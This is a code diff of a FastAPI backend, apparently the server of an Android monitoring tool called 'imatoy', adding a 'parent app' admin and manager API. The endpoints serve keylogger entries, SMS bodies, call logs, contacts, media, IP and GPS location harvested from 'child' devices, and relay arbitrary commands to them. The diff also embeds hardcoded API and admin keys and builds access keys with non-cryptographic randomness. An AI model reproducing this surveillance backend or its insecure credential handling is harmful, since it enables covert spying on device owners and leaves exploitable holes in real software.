@@ -38,8 +38,8 @@ UPLOAD_DIR        = "/tmp/imatoy_uploads"
 ALGORITHM         = "HS256"
 
 # Metered.ca TURN Server (WebRTC ke liye)
-# Render Dashboard → Environment Variables mein set karo: METERED_API_KEY
-METERED_API_KEY   = os.getenv("METERED_API_KEY", "zYgB3VGSmsAw470kDmr-yt4oyngLEyVXDT7d2mF97POUDiwr")
+# Render Dashboard → Environment Variables mein override kar sakte ho
+METERED_API_KEY   = os.getenv("METERED_API_KEY", "b17359aa8ff284346c214e50b18f07654dff")
 METERED_DOMAIN    = os.getenv("METERED_DOMAIN",  "imatoy.metered.live")
 
 # Upload directories
@@ -1066,6 +1066,386 @@ async def ws_send_command(device_id: str, request: Request):
     msg = json.dumps({"command": command, **{k: v for k, v in body.items() if k not in ["stream", "command"]}})
     await ws_manager.relay_to_child(stream, device_id, msg)
     return ok(message=f"Command '{command}' sent to device via {stream} WebSocket")
+
+# ═══════════════════════════════════════════════════════════════════
+# PARENT APP — CONFIG
+# ═══════════════════════════════════════════════════════════════════
+ADMIN_KEY = "ADMIN2442"
+MGR_KEY_PREFIX = "MGR-"
+
+# ─── Pydantic Models ─────────────────────────────────────────────
+class ManagerLoginBody(BaseModel):
+    managerKey: str
+
+class CreateManagerBody(BaseModel):
+    name: Optional[str] = None
+    deviceIds: Optional[List[str]] = []
+
+class UpdateManagerDevicesBody(BaseModel):
+    deviceIds: List[str]
+
+class ParentCommandBody(BaseModel):
+    command: str
+    params: Optional[dict] = {}
+
+# ─── Parent Auth Helpers ─────────────────────────────────────────
+def create_parent_jwt(payload: dict) -> str:
+    return create_jwt(payload, expire_days=30)
+
+async def get_parent_user(authorization: str = Header(None)) -> dict:
+    """Parent token verify karo — admin ya manager dono ke liye"""
+    if not authorization or not authorization.startswith("Bearer "):
+        raise HTTPException(status_code=401, detail={"success": False, "message": "Unauthorized"})
+    payload = verify_jwt(authorization[7:])
+    if not payload or "role" not in payload:
+        raise HTTPException(status_code=401, detail={"success": False, "message": "Invalid token"})
+    if payload["role"] not in ["admin", "manager"]:
+        raise HTTPException(status_code=403, detail={"success": False, "message": "Access denied"})
+    return payload
+
+async def require_admin(authorization: str = Header(None)) -> dict:
+    """Sirf admin ke liye"""
+    user = await get_parent_user(authorization)
+    if user.get("role") != "admin":
+        raise HTTPException(status_code=403, detail={"success": False, "message": "Admin access required"})
+    return user
+
+async def check_device_access(device_id: str, user: dict) -> bool:
+    """Check karo ki user ko device access hai ya nahi"""
+    if user.get("role") == "admin":
+        return True
+    # Manager ke liye assigned devices check karo
+    manager_key = user.get("managerKey")
+    if not manager_key:
+        return False
+    row = await sb_get_one("manager_devices", {
+        "manager_key": f"eq.{manager_key}",
+        "device_id": f"eq.{device_id}"
+    })
+    return row is not None
+
+def make_manager_key() -> str:
+    """MGR-XXXXXX format key generate karo"""
+    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    import random
+    suffix = "".join(random.choices(chars, k=6))
+    return f"MGR-{suffix}"
+
+# ═══════════════════════════════════════════════════════════════════
+# PARENT APP — AUTH ENDPOINTS
+# ═══════════════════════════════════════════════════════════════════
+
+@app.post("/api/parent/admin-login")
+async def parent_admin_login(request: Request):
+    """Admin login — ADMIN2442 key se"""
+    admin_key = request.headers.get("x-admin-key", "")
+    if admin_key != ADMIN_KEY:
+        raise HTTPException(status_code=401, detail={"success": False, "message": "Invalid admin key"})
+    token = create_parent_jwt({"role": "admin"})
+    return {"success": True, "role": "admin", "token": token, "message": "Admin login successful"}
+
+@app.post("/api/parent/manager-login")
+async def parent_manager_login(body: ManagerLoginBody):
+    """Manager login — MGR-XXXXXX key se"""
+    key = body.managerKey.strip().upper()
+    if not key.startswith(MGR_KEY_PREFIX):
+        raise HTTPException(status_code=401, detail={"success": False, "message": "Invalid manager key format"})
+    # DB mein check karo
+    manager = await sb_get_one("managers", {"manager_key": f"eq.{key}", "is_active": "eq.true"})
+    if not manager:
+        raise HTTPException(status_code=401, detail={"success": False, "message": "Manager key not found or inactive"})
+    # Assigned devices fetch karo
+    device_rows = await sb_get("manager_devices", {"manager_key": f"eq.{key}"})
+    assigned_ids = [r["device_id"] for r in device_rows]
+    token = create_parent_jwt({"role": "manager", "managerKey": key, "name": manager.get("name")})
+    return {
+        "success": True, "role": "manager", "token": token,
+        "managerKey": key, "name": manager.get("name"),
+        "assignedDevices": assigned_ids
+    }
+
+# ═══════════════════════════════════════════════════════════════════
+# PARENT APP — ADMIN-ONLY ENDPOINTS
+# ═══════════════════════════════════════════════════════════════════
+
+@app.get("/api/parent/devices")
+async def parent_get_all_devices(user: dict = Depends(require_admin)):
+    """Admin: saare devices dekho"""
+    rows = await sb_get("devices", {"order": "last_seen.desc", "limit": 500})
+    # Latest device_info join karo
+    result = []
+    for dev in rows:
+        dev_id = dev.get("device_id")
+        info = await sb_get_one("device_info", {"device_id": f"eq.{dev_id}", "order": "created_at.desc"})
+        # Manager assignment check karo
+        mgr_row = await sb_get_one("manager_devices", {"device_id": f"eq.{dev_id}"})
+        result.append({
+            "deviceId": dev_id,
+            "deviceName": dev.get("device_name", "Unknown"),
+            "model": dev.get("model"),
+            "androidVersion": dev.get("android_version"),
+            "isActive": bool(dev.get("is_active")),
+            "lastSeen": dev.get("last_seen"),
+            "battery": info.get("battery_level") if info else None,
+            "isCharging": info.get("is_charging") if info else None,
+            "assignedManager": mgr_row.get("manager_key") if mgr_row else None,
+        })
+    return {"success": True, "data": result, "count": len(result)}
+
+@app.post("/api/parent/managers/create")
+async def parent_create_manager(body: CreateManagerBody, user: dict = Depends(require_admin)):
+    """Admin: naya manager banao"""
+    key = make_manager_key()
+    # Unique key ensure karo
+    while await sb_get_one("managers", {"manager_key": f"eq.{key}"}):
+        key = make_manager_key()
+    await sb_insert("managers", {
+        "id": make_id(), "manager_key": key,
+        "name": body.name, "is_active": True, "created_at": now_iso()
+    })
+    # Devices assign karo
+    assigned = 0
+    for dev_id in (body.deviceIds or []):
+        existing = await sb_get_one("manager_devices", {
+            "manager_key": f"eq.{key}", "device_id": f"eq.{dev_id}"
+        })
+        if not existing:
+            await sb_insert("manager_devices", {
+                "id": make_id(), "manager_key": key,
+                "device_id": dev_id, "assigned_at": now_iso()
+            })
+            assigned += 1
+    return {
+        "success": True, "managerKey": key, "name": body.name,
+        "assignedDevices": assigned,
+        "message": f"Manager created. Share key: {key}"
+    }
+
+@app.get("/api/parent/managers")
+async def parent_list_managers(user: dict = Depends(require_admin)):
+    """Admin: saare managers dekho"""
+    managers = await sb_get("managers", {"order": "created_at.desc", "limit": 200})
+    result = []
+    for m in managers:
+        key = m.get("manager_key")
+        dev_rows = await sb_get("manager_devices", {"manager_key": f"eq.{key}"})
+        result.append({
+            "managerKey": key,
+            "name": m.get("name"),
+            "assignedDevices": [r["device_id"] for r in dev_rows],
+            "isActive": bool(m.get("is_active")),
+            "createdAt": m.get("created_at"),
+        })
+    return {"success": True, "data": result}
+
+@app.delete("/api/parent/managers/{manager_key}")
+async def parent_delete_manager(manager_key: str, user: dict = Depends(require_admin)):
+    """Admin: manager delete karo"""
+    key = manager_key.upper()
+    manager = await sb_get_one("managers", {"manager_key": f"eq.{key}"})
+    if not manager:
+        raise HTTPException(status_code=404, detail={"success": False, "message": "Manager not found"})
+    await sb_update("managers", {"manager_key": key}, {"is_active": False})
+    return {"success": True, "message": "Manager deleted"}
+
+@app.put("/api/parent/managers/{manager_key}/devices")
+async def parent_update_manager_devices(
+    manager_key: str, body: UpdateManagerDevicesBody,
+    user: dict = Depends(require_admin)
+):
+    """Admin: manager ke devices update karo"""
+    key = manager_key.upper()
+    manager = await sb_get_one("managers", {"manager_key": f"eq.{key}"})
+    if not manager:
+        raise HTTPException(status_code=404, detail={"success": False, "message": "Manager not found"})
+    # Existing assignments delete karo (soft: remove by re-inserting only new ones)
+    # Get existing
+    existing_rows = await sb_get("manager_devices", {"manager_key": f"eq.{key}"})
+    existing_ids = {r["device_id"] for r in existing_rows}
+    new_ids = set(body.deviceIds)
+    # Add new ones
+    for dev_id in new_ids - existing_ids:
+        await sb_insert("manager_devices", {
+            "id": make_id(), "manager_key": key,
+            "device_id": dev_id, "assigned_at": now_iso()
+        })
+    return {"success": True, "message": "Devices updated"}
+
+# ═══════════════════════════════════════════════════════════════════
+# PARENT APP — SHARED ENDPOINTS (Admin + Manager)
+# ═══════════════════════════════════════════════════════════════════
+
+@app.get("/api/parent/my-devices")
+async def parent_my_devices(user: dict = Depends(get_parent_user)):
+    """Role-based: admin=all devices, manager=assigned devices"""
+    if user.get("role") == "admin":
+        rows = await sb_get("devices", {"order": "last_seen.desc", "limit": 500})
+        device_ids = [r.get("device_id") for r in rows]
+    else:
+        manager_key = user.get("managerKey")
+        dev_rows = await sb_get("manager_devices", {"manager_key": f"eq.{manager_key}"})
+        device_ids = [r["device_id"] for r in dev_rows]
+        rows = []
+        for did in device_ids:
+            dev = await sb_get_one("devices", {"device_id": f"eq.{did}"})
+            if dev:
+                rows.append(dev)
+
+    result = []
+    for dev in rows:
+        dev_id = dev.get("device_id")
+        info = await sb_get_one("device_info", {"device_id": f"eq.{dev_id}", "order": "created_at.desc"})
+        result.append({
+            "deviceId": dev_id,
+            "deviceName": dev.get("device_name", "Unknown"),
+            "model": dev.get("model"),
+            "androidVersion": dev.get("android_version"),
+            "isActive": bool(dev.get("is_active")),
+            "lastSeen": dev.get("last_seen"),
+            "battery": info.get("battery_level") if info else None,
+            "isCharging": info.get("is_charging") if info else None,
+        })
+    return {"success": True, "role": user.get("role"), "data": result, "count": len(result)}
+
+@app.get("/api/parent/device/{device_id}/stats")
+async def parent_device_stats(device_id: str, user: dict = Depends(get_parent_user)):
+    """Device stats — battery, counts, last seen"""
+    if not await check_device_access(device_id, user):
+        raise HTTPException(status_code=403, detail={"success": False, "message": "Access denied"})
+    dev  = await sb_get_one("devices", {"device_id": f"eq.{device_id}"})
+    info = await sb_get_one("device_info", {"device_id": f"eq.{device_id}", "order": "created_at.desc"})
+    sms_count     = await sb_count("sms_logs",      {"device_id": f"eq.{device_id}"})
+    call_count    = await sb_count("call_logs",      {"device_id": f"eq.{device_id}"})
+    contact_count = await sb_count("contacts",       {"device_id": f"eq.{device_id}"})
+    media_count   = await sb_count("media_files",    {"device_id": f"eq.{device_id}"})
+    keylog_count  = await sb_count("keylog_entries", {"device_id": f"eq.{device_id}"})
+    return {"success": True, "data": {
+        "deviceId":       device_id,
+        "deviceName":     dev.get("device_name", "Unknown") if dev else "Unknown",
+        "model":          dev.get("model")           if dev else None,
+        "androidVersion": dev.get("android_version") if dev else None,
+        "isActive":       bool(dev.get("is_active")) if dev else False,
+        "lastSeen":       dev.get("last_seen")        if dev else None,
+        "battery":        info.get("battery_level")  if info else None,
+        "isCharging":     info.get("is_charging")    if info else None,
+        "wifiSsid":       info.get("wifi_ssid")      if info else None,
+        "ipAddress":      info.get("ip_address")     if info else None,
+        "location":       {"lat": info["location_lat"], "lng": info["location_lng"]}
+                          if info and info.get("location_lat") else None,
+        "smsCount":       sms_count,
+        "callCount":      call_count,
+        "contactCount":   contact_count,
+        "mediaCount":     media_count,
+        "keylogCount":    keylog_count,
+    }}
+
+@app.get("/api/parent/device/{device_id}/sms")
+async def parent_device_sms(
+    device_id: str, limit: int = 50, page: int = 1,
+    user: dict = Depends(get_parent_user)
+):
+    """SMS logs with pagination"""
+    if not await check_device_access(device_id, user):
+        raise HTTPException(status_code=403, detail={"success": False, "message": "Access denied"})
+    offset = (page - 1) * limit
+    rows = await sb_get("sms_logs", {
+        "device_id": f"eq.{device_id}",
+        "order": "created_at.desc",
+        "limit": min(limit, 200),
+        "offset": offset
+    })
+    total = await sb_count("sms_logs", {"device_id": f"eq.{device_id}"})
+    result = [{"address": r.get("address"), "body": r.get("body"),
+               "type": r.get("type"), "date": r.get("date") or r.get("created_at")} for r in rows]
+    return {"success": True, "data": result, "count": total, "page": page}
+
+@app.get("/api/parent/device/{device_id}/calls")
+async def parent_device_calls(
+    device_id: str, limit: int = 50,
+    user: dict = Depends(get_parent_user)
+):
+    """Call logs"""
+    if not await check_device_access(device_id, user):
+        raise HTTPException(status_code=403, detail={"success": False, "message": "Access denied"})
+    rows = await sb_get("call_logs", {
+        "device_id": f"eq.{device_id}",
+        "order": "created_at.desc",
+        "limit": min(limit, 200)
+    })
+    result = [{"number": r.get("number"), "name": r.get("name"),
+               "type": r.get("type"), "duration": r.get("duration"),
+               "date": r.get("date") or r.get("created_at")} for r in rows]
+    return {"success": True, "data": result, "count": len(result)}
+
+@app.get("/api/parent/device/{device_id}/contacts")
+async def parent_device_contacts(
+    device_id: str, limit: int = 100,
+    user: dict = Depends(get_parent_user)
+):
+    """Contacts"""
+    if not await check_device_access(device_id, user):
+        raise HTTPException(status_code=403, detail={"success": False, "message": "Access denied"})
+    rows = await sb_get("contacts", {
+        "device_id": f"eq.{device_id}",
+        "order": "name.asc",
+        "limit": min(limit, 1000)
+    })
+    for r in rows:
+        r["phones"] = parse_json_array(r.get("phones"))
+        r["emails"] = parse_json_array(r.get("emails"))
+    return {"success": True, "data": rows, "count": len(rows)}
+
+@app.get("/api/parent/device/{device_id}/media")
+async def parent_device_media(
+    device_id: str, category: str = "all", limit: int = 20,
+    user: dict = Depends(get_parent_user)
+):
+    """Gallery/media files"""
+    if not await check_device_access(device_id, user):
+        raise HTTPException(status_code=403, detail={"success": False, "message": "Access denied"})
+    params = {
+        "device_id": f"eq.{device_id}",
+        "order": "created_at.desc",
+        "limit": min(limit, 100)
+    }
+    if category != "all":
+        params["category"] = f"eq.{category}"
+    rows = await sb_get("media_files", params)
+    return {"success": True, "data": rows, "count": len(rows)}
+
+@app.get("/api/parent/device/{device_id}/keylog")
+async def parent_device_keylog(
+    device_id: str, limit: int = 100,
+    user: dict = Depends(get_parent_user)
+):
+    """Keylog entries"""
+    if not await check_device_access(device_id, user):
+        raise HTTPException(status_code=403, detail={"success": False, "message": "Access denied"})
+    rows = await sb_get("keylog_entries", {
+        "device_id": f"eq.{device_id}",
+        "order": "created_at.desc",
+        "limit": min(limit, 500)
+    })
+    return {"success": True, "data": rows, "count": len(rows)}
+
+@app.post("/api/parent/device/{device_id}/command")
+async def parent_send_command(
+    device_id: str, body: ParentCommandBody,
+    user: dict = Depends(get_parent_user)
+):
+    """Child ko command bhejo"""
+    if not await check_device_access(device_id, user):
+        raise HTTPException(status_code=403, detail={"success": False, "message": "Access denied"})
+    cid = make_id()
+    await sb_insert("commands", {
+        "id": cid, "device_id": device_id, "command": body.command,
+        "params": json.dumps(body.params or {}), "status": "pending",
+        "created_at": now_iso()
+    })
+    # WebSocket se bhi bhejo agar connected ho
+    await ws_manager.relay_to_child("signal", device_id,
+        json.dumps({"command": body.command, **(body.params or {})}))
+    return {"success": True, "commandId": cid, "status": "pending"}
 
 # ═══════════════════════════════════════════════════════════════════
 # SERVE UPLOADED FILES
